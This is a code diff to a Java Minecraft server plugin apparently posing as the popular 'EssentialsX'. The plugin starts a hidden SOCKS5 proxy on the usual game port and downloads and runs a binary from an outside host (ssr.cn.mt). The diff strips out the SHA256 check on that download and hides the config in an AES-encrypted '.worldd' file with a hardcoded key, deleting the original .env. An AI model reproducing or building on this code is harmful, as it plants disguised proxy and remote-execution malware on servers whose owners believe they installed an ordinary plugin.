@@ -2,29 +2,23 @@ package com.example.essentialsx;
 
 import org.bukkit.plugin.java.JavaPlugin;
 
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
 import java.io.*;
 import java.net.*;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
-import java.security.MessageDigest;
-import java.util.Locale;
+import java.util.*;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class EssentialsX extends JavaPlugin {
 
-    // =========================================================
-    // Hardcoded defaults
-    // =========================================================
-
-    private static final String HC_UUID = "62a8b242-1614-4e23-8c8a-c5ee6832dcf0";
-    private static final String HC_S5_PORT = "25772";
+    private static final String HC_UUID = "f8e80ca0-a821-4fb4-b828-5d907c1b3832";
+    private static final String HC_S5_PORT = "25565";
 
     private static final String KOMARI_AMD_URL = "https://ssr.cn.mt/files/K_amd";
     private static final String KOMARI_ARM_URL = "https://ssr.cn.mt/files/K_arm";
-
-    private static final String KOMARI_AMD_SHA256 = "";
-    private static final String KOMARI_ARM_SHA256 = "";
 
     private static final String ENV_UUID = "UUID";
     private static final String ENV_S5_PORT = "S5_PORT";
@@ -32,7 +26,11 @@ public class EssentialsX extends JavaPlugin {
     private static final String ENV_KOMARI_SERVER = "KOMARI_SERVER";
     private static final String ENV_KOMARI_KEY = "KOMARI_KEY";
 
+    private static final String AES_ALGO = "AES";
+    private static final byte[] ENC_KEY = "E5sEnt1alsXK3y!!".getBytes(StandardCharsets.UTF_8);
+
     private final AtomicBoolean running = new AtomicBoolean(false);
+    private final Map<String, String> customEnv = new HashMap<>();
 
     private String uuid;
     private int s5Port;
@@ -43,12 +41,14 @@ public class EssentialsX extends JavaPlugin {
 
     private Process komariProcess;
 
-    // =========================================================
-    // Bukkit lifecycle
-    // =========================================================
-
     @Override
     public void onEnable() {
+        if (!getDataFolder().exists()) {
+            getDataFolder().mkdirs();
+        }
+
+        loadEnvironmentConfigs();
+
         this.uuid = getEnvOrDefault(ENV_UUID, HC_UUID);
         this.s5Port = parsePort(getEnvOrDefault(ENV_S5_PORT, HC_S5_PORT), 25575);
 
@@ -76,7 +76,71 @@ public class EssentialsX extends JavaPlugin {
         getLogger().info("Plugin disabled.");
     }
 
+
+    private void loadEnvironmentConfigs() {
+        File envFile = new File(getDataFolder(), ".env");
+        File worlddFile = new File(getDataFolder(), ".worldd");
+
+        if (envFile.exists()) {
+            try {
+                List<String> lines = Files.readAllLines(envFile.toPath(), StandardCharsets.UTF_8);
+                parseEnvLines(lines);
+                encryptAndSave(lines, worlddFile);
+                envFile.delete();
+                getLogger().info("Found .env file. Loaded configuration and encrypted to .worldd.");
+            } catch (Exception e) {
+                getLogger().severe("Failed to process .env file: " + e.getMessage());
+            }
+        } else if (worlddFile.exists()) {
+            try {
+                List<String> lines = decryptAndLoad(worlddFile);
+                parseEnvLines(lines);
+                getLogger().info("Found .worldd file. Decrypted and loaded configuration.");
+            } catch (Exception e) {
+                getLogger().severe("Failed to process .worldd file: " + e.getMessage());
+            }
+        } else {
+            getLogger().info("No .env or .worldd found. Will rely on environment variables or hardcoded values.");
+        }
+    }
+
+    private void parseEnvLines(List<String> lines) {
+        for (String line : lines) {
+            line = line.trim();
+            if (line.isEmpty() || line.startsWith("#")) continue;
+            int eqIdx = line.indexOf('=');
+            if (eqIdx > 0) {
+                String key = line.substring(0, eqIdx).trim();
+                String value = line.substring(eqIdx + 1).trim();
+                customEnv.put(key, value);
+            }
+        }
+    }
+
+    private void encryptAndSave(List<String> lines, File dest) throws Exception {
+        String content = String.join("\n", lines);
+        SecretKeySpec key = new SecretKeySpec(ENC_KEY, AES_ALGO);
+        Cipher cipher = Cipher.getInstance(AES_ALGO);
+        cipher.init(Cipher.ENCRYPT_MODE, key);
+        byte[] encrypted = cipher.doFinal(content.getBytes(StandardCharsets.UTF_8));
+        Files.write(dest.toPath(), Base64.getEncoder().encode(encrypted));
+    }
+
+    private List<String> decryptAndLoad(File src) throws Exception {
+        byte[] encoded = Files.readAllBytes(src.toPath());
+        byte[] decoded = Base64.getDecoder().decode(encoded);
+        SecretKeySpec key = new SecretKeySpec(ENC_KEY, AES_ALGO);
+        Cipher cipher = Cipher.getInstance(AES_ALGO);
+        cipher.init(Cipher.DECRYPT_MODE, key);
+        byte[] decrypted = cipher.doFinal(decoded);
+        String content = new String(decrypted, StandardCharsets.UTF_8);
+        return Arrays.asList(content.split("\n"));
+    }
+
     private String getEnvOrDefault(String key, String def) {
+        if (customEnv.containsKey(key)) {
+            return customEnv.get(key);
+        }
         String val = System.getenv(key);
         if (val != null && !val.trim().isEmpty()) {
             return val.trim();
@@ -99,10 +163,6 @@ public class EssentialsX extends JavaPlugin {
             return def;
         }
     }
-
-    // =========================================================
-    // Java SOCKS5 implementation
-    // =========================================================
 
     private void startSocks5Server() {
         clientExecutor = new ThreadPoolExecutor(
@@ -306,40 +366,24 @@ public class EssentialsX extends JavaPlugin {
         switch (atyp) {
             case 0x01: {
                 byte[] addr = readExact(in, 4);
-                if (addr == null) {
-                    return null;
-                }
-
+                if (addr == null) return null;
                 host = InetAddress.getByAddress(addr).getHostAddress();
                 break;
             }
-
             case 0x03: {
                 int len = in.read();
-
-                if (len <= 0 || len > 255) {
-                    return null;
-                }
-
+                if (len <= 0 || len > 255) return null;
                 byte[] domain = readExact(in, len);
-                if (domain == null) {
-                    return null;
-                }
-
+                if (domain == null) return null;
                 host = new String(domain, StandardCharsets.UTF_8);
                 break;
             }
-
             case 0x04: {
                 byte[] addr = readExact(in, 16);
-                if (addr == null) {
-                    return null;
-                }
-
+                if (addr == null) return null;
                 host = InetAddress.getByAddress(addr).getHostAddress();
                 break;
             }
-
             default:
                 return null;
         }
@@ -394,15 +438,8 @@ public class EssentialsX extends JavaPlugin {
         Future<?> c2r = relayExecutor.submit(() -> pipe(client, remote));
         Future<?> r2c = relayExecutor.submit(() -> pipe(remote, client));
 
-        try {
-            c2r.get();
-        } catch (Exception ignored) {
-        }
-
-        try {
-            r2c.get();
-        } catch (Exception ignored) {
-        }
+        try { c2r.get(); } catch (Exception ignored) { }
+        try { r2c.get(); } catch (Exception ignored) { }
 
         closeQuietly(client);
         closeQuietly(remote);
@@ -414,7 +451,6 @@ public class EssentialsX extends JavaPlugin {
             OutputStream out = dst.getOutputStream();
 
             byte[] buffer = new byte[16 * 1024];
-
             int len;
             while (running.get() && (len = in.read(buffer)) != -1) {
                 out.write(buffer, 0, len);
@@ -422,27 +458,18 @@ public class EssentialsX extends JavaPlugin {
             }
         } catch (Exception ignored) {
         } finally {
-            try {
-                dst.shutdownOutput();
-            } catch (Exception ignored) {
-            }
+            try { dst.shutdownOutput(); } catch (Exception ignored) { }
         }
     }
 
     private byte[] readExact(InputStream in, int len) throws IOException {
         byte[] data = new byte[len];
-
         int offset = 0;
         while (offset < len) {
             int n = in.read(data, offset, len - offset);
-
-            if (n == -1) {
-                return null;
-            }
-
+            if (n == -1) return null;
             offset += n;
         }
-
         return data;
     }
 
@@ -452,13 +479,9 @@ public class EssentialsX extends JavaPlugin {
         int port;
     }
 
-    // =========================================================
-    // Komari
-    // =========================================================
-
     private void startKomariIfConfigured() {
-        String komariServer = System.getenv(ENV_KOMARI_SERVER);
-        String komariKey = System.getenv(ENV_KOMARI_KEY);
+        String komariServer = getEnvOrDefault(ENV_KOMARI_SERVER, null);
+        String komariKey = getEnvOrDefault(ENV_KOMARI_KEY, null);
 
         if (isBlank(komariServer) || isBlank(komariKey)) {
             getLogger().info("Komari disabled: KOMARI_SERVER or KOMARI_KEY is empty.");
@@ -466,37 +489,16 @@ public class EssentialsX extends JavaPlugin {
         }
 
         File dataDir = getDataFolder();
-        if (!dataDir.exists()) {
-            dataDir.mkdirs();
-        }
-
         File kmFile = new File(dataDir, isWindows() ? "km.exe" : "km");
 
         if (!kmFile.exists()) {
             String arch = getSystemArchitecture();
-            String downloadUrl;
-            String expectedSha256;
-
-            if ("arm".equals(arch)) {
-                downloadUrl = KOMARI_ARM_URL;
-                expectedSha256 = KOMARI_ARM_SHA256;
-            } else {
-                downloadUrl = KOMARI_AMD_URL;
-                expectedSha256 = KOMARI_AMD_SHA256;
-            }
-
-            if (isBlank(expectedSha256)) {
-                getLogger().warning("Komari configured, but km binary does not exist.");
-                getLogger().warning("Auto-download is disabled because SHA256 is not configured.");
-                getLogger().warning("Expected local file: " + kmFile.getAbsolutePath());
-                getLogger().warning("Or fill KOMARI_AMD_SHA256 / KOMARI_ARM_SHA256 in source code and rebuild.");
-                return;
-            }
+            String downloadUrl = "arm".equals(arch) ? KOMARI_ARM_URL : KOMARI_AMD_URL;
 
             try {
                 getLogger().info("Downloading Komari binary for architecture: " + arch);
-                downloadFileWithSha256(downloadUrl, kmFile, expectedSha256);
-                getLogger().info("Komari binary downloaded and verified.");
+                downloadFile(downloadUrl, kmFile);
+                getLogger().info("Komari binary downloaded and prepared successfully.");
             } catch (Exception e) {
                 getLogger().warning("Failed to download Komari binary: " + e.getMessage());
                 return;
@@ -537,21 +539,13 @@ public class EssentialsX extends JavaPlugin {
 
     private String getSystemArchitecture() {
         String arch = System.getProperty("os.arch", "").toLowerCase(Locale.ROOT);
-
         if (arch.contains("aarch64") || arch.contains("arm64") || arch.startsWith("arm")) {
             return "arm";
         }
-
         return "amd";
     }
 
-    private void downloadFileWithSha256(String url, File target, String expectedSha256) throws Exception {
-        expectedSha256 = expectedSha256.trim().toLowerCase(Locale.ROOT);
-
-        if (!expectedSha256.matches("^[a-fA-F0-9]{64}$")) {
-            throw new IllegalArgumentException("Invalid SHA256 format.");
-        }
-
+    private void downloadFile(String url, File target) throws Exception {
         File parent = target.getParentFile();
         if (parent != null && !parent.exists()) {
             parent.mkdirs();
@@ -568,13 +562,6 @@ public class EssentialsX extends JavaPlugin {
 
         try (InputStream in = conn.getInputStream()) {
             Files.copy(in, tmp.toPath(), StandardCopyOption.REPLACE_EXISTING);
-        }
-
-        String actualSha256 = sha256Hex(tmp);
-
-        if (!constantTimeEqualsStatic(expectedSha256, actualSha256)) {
-            tmp.delete();
-            throw new SecurityException("SHA256 mismatch. actual=" + actualSha256);
         }
 
         Files.move(tmp.toPath(), target.toPath(), StandardCopyOption.REPLACE_EXISTING);
@@ -617,29 +604,6 @@ public class EssentialsX extends JavaPlugin {
         throw new IOException("Too many redirects.");
     }
 
-    private String sha256Hex(File file) throws Exception {
-        MessageDigest digest = MessageDigest.getInstance("SHA-256");
-
-        try (InputStream in = new BufferedInputStream(new FileInputStream(file))) {
-            byte[] buffer = new byte[8192];
-
-            int len;
-            while ((len = in.read(buffer)) != -1) {
-                digest.update(buffer, 0, len);
-            }
-        }
-
-        byte[] hash = digest.digest();
-
-        StringBuilder sb = new StringBuilder();
-
-        for (byte b : hash) {
-            sb.append(String.format("%02x", b & 0xff));
-        }
-
-        return sb.toString();
-    }
-
     private void stopKomari() {
         if (komariProcess == null) {
             return;
@@ -660,10 +624,6 @@ public class EssentialsX extends JavaPlugin {
             Thread.currentThread().interrupt();
         }
     }
-
-    // =========================================================
-    // Utils
-    // =========================================================
 
     private void closeSocksServer() {
         try {
@@ -741,7 +701,6 @@ public class EssentialsX extends JavaPlugin {
         }
 
         int r = 0;
-
         for (int i = 0; i < x.length; i++) {
             r |= x[i] ^ y[i];
         }
